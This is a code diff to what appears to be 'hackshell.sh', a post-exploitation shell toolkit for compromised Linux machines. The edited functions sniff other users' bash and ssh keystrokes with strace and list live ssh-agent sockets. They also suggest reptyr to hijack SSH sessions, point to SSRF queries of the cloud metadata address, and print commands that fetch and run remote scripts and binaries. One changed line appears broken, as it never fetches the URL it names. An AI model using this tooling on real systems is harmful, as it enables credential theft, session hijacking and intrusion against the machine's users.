@@ -18,6 +18,8 @@
 #
 # 2024 by theM0ntarCann0n & skpr
 
+_HSURL="https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh"
+
 _hs_init_color() {
     [ -n "$CY" ] && return
     CY="\033[1;33m" # yellow
@@ -146,7 +148,7 @@ xssh() {
             opts=("-oControlMaster=auto" "-oControlPath=\"${XHOME}/.ssh-unix.%C\"" "-oControlPersist=15")
         }
     }
-    echo -e "May need to cut & paste:  ${CDC}source <(curl -SsfL https://thc.org/hs)${CN}"
+    echo -e "May need to cut & paste:  ${CDC}source <(${_HSURL})${CN}"
     stty raw -echo icrnl opost
     \ssh "${HS_SSH_OPT[@]}" "${opts[@]}" -T \
         "$@" \
@@ -166,11 +168,19 @@ purl() {
     local url="${1:?}"
     { [[ "${url:0:8}" == "https://" ]] || [[ "${url:0:7}" == "http://" ]]; } || url="https://${url}"
     [ -n "$UNSAFE" ] && {
-        opts_init="import ssl;ctx = ssl.create_default_context();ctx.check_hostname = False;ctx.verify_mode = ssl.CERT_NONE;"
+        opts_init="\
+import ssl
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE"
         opts+=", context=ctx"
     }
-    "$HS_PY" -c "import urllib.request;import sys;${opts_init}sys.stdout.buffer.write(urllib.request.urlopen(\"$url\", $opts).read())"
+    "$HS_PY" -c "import urllib.request
+import sys
+${opts_init}
+sys.stdout.buffer.write(urllib.request.urlopen(\"$url\", $opts).read())"
 }
+
 
 surl() {
     local r="${1#*://}"
@@ -490,10 +500,12 @@ xkeep() {
 
 tit() {
     local str
+    local has_gawk
     _hs_dep strace
-    _hs_dep awk
+    # _hs_dep gawk
     _hs_dep grep
 
+    command -v gawk >/dev/null && has_gawk=1
     [ $# -eq 0 ] && {
         str="$(ps -eF | grep -E '(^UID|bash|ssh )' | grep -v ' grep')"
         [ -n "$str" ] && {
@@ -508,7 +520,26 @@ tit() {
         echo -e "${CN}>>> ${CW}TIP${CN}: ${CDC}ptysnoop.bt${CN} from ${CB}${CUL}https://github.com/hackerschoice/bpfhacks${CN} works better"
         return
     }
-	strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep "^${1}"'.*= [1-9]$' | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
+	# strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep "^${1}"'.*= [1-9]$' | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
+	# strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep -vF ...  | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
+    # gawk 'BEGIN{FS="\""; ORS=""}/\.\.\./ { next }; {for(i=2;i<NF;i++) printf "%s%s", $i, (i<NF-1?FS:""); gsub(/(\\33){1,}\[[0-9;]*[^0-9;]?||\\33O[ABCDR]?/, ""); if ($0=="\\r"){print "\n"}else{print $0; fflush()}}'
+    if [ -n "$has_gawk" ]; then
+	    strace -e trace="${1:?}" -p "${2:?}" 2>&1 | gawk 'BEGIN{ORS=""}/\.\.\./ { next }; {$0 = substr($0, index($0, "\"")+1); sub(/"[^"]*$/, "", $0); gsub(/(\\33){1,}\[[0-9;]*[^0-9;]?||\\33O[ABCDR]?/, ""); if ($0=="\\r"){print "\n"}else{print $0; fflush()}}'
+    # elif command -v awk >/dev/null; then
+        # strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep -vF ...  | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
+    else
+	    strace -e trace="${1:?}" -p "${2:?}" 2>&1 | while read -r x; do
+            [[ "$x" == *"..."* ]] && continue
+            x="${x#*\"}"
+            x="${x%\"*}"
+            x="${x//\\33O[ABCDR]/}"
+            x="${x//\\33[200~/}"
+            x="${x//\\33[201~/}"
+            x="${x//\\33\[[56]~/}"
+            [ "$x" == "\\r" ] && { echo ""; continue; }
+            echo -n "$x"
+        done
+    fi
 }
 
 np() {
@@ -840,8 +871,12 @@ command -v gs-netcat >/dev/null || gs-netcat() { gsnc "$@"; }
 lootlight() {
     local str
     ls -al /tmp/ssh-* &>/dev/null && {
-        echo -e "${CB}SSH-AGENT${CDY}${CF}"
-        find /tmp -name 'agent.*' -ls
+        echo -e "${CB}SSH_AUTH_SOCK${CDY}${CF}"
+        find /tmp -name 'agent.*' | while read -r fn; do
+            unset str
+            command -v lsof >/dev/null && lsof "$fn" &>/dev/null && str="[ACTIVE]"
+            echo "$(ls -al "$fn")"$'\t'"${str}"
+        done
         echo -e "${CN}"
     }
 
@@ -882,7 +917,7 @@ lootlight() {
         fi
     fi
     [ -n "$str" ] && {
-        echo -e "${CB}SSH-Hijack (reptyr)${CDY}${CF}"
+        echo -e "${CB}SSH-Hijack ${CF}[reptyr -T \$(pidof -s ssh)]${CDY}${CF}"
         echo "${str}"
         echo -e "${CN}"
     }
@@ -956,6 +991,10 @@ loot() {
     [ -z "$_HS_NO_SSRF_169" ] && {
         # Found an SSRF
         echo -e "${CW}TIP:${CN} See ${CB}${CUL}https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf${CN}"
+        [ -n "$_HS_GOT_SSRF_169" ] && {
+            # Found and SSRF but could not get infos.
+            echo -e "${CW}TIP:${CN} Try ${CDC}dl http://169.254.169.254/openstack${CN}"
+        }
     }
 
     [ "$UID" -ne 0 ] && {
@@ -1145,7 +1184,7 @@ hs_init() {
     local str
 
     [ -z "$BASH" ] && { HS_WARN "Shell is not BASH. Try:
-${CY}>>>>> ${CDC}curl -obash -SsfL 'https://bin.ajam.dev/$(uname -m)/bash && chmod 700 bash && exec bash -il'"; sleep 2; }
+${CY}>>>>> ${CDC}curl -obash -SsfL \"https://bin.ajam.dev/$(uname -m)/bash\" && chmod 700 bash && exec ./bash -il"; sleep 2; }
     [ -n "$BASH" ] && [ "${prg##*\.}" = "sh" ] && { HS_ERR "Use ${CDC}source $prg${CDR} instead"; sleep 2; exit 255; }
     [ -n "$BASH" ] && {
         str="$(command -v bash)"
@@ -1156,8 +1195,9 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL 'https://bin.ajam.dev/$(uname -m)/bash && chm
     [ -n "$_HS_HOME_ORIG" ] && export HOME="$_HS_HOME_ORIG"
     export _HS_HOME_ORIG="$HOME"
 
-    [ -z "${HS_PY}" ] && HS_PY="$(command -v python)"
+    # Favour python3 over python2
     [ -z "${HS_PY}" ] && HS_PY="$(command -v python3)"
+    [ -z "${HS_PY}" ] && HS_PY="$(command -v python)"
     [ -z "${HS_PY}" ] && HS_PY="$(command -v python2)"
     HS_PY="${HS_PY##*/}"
 
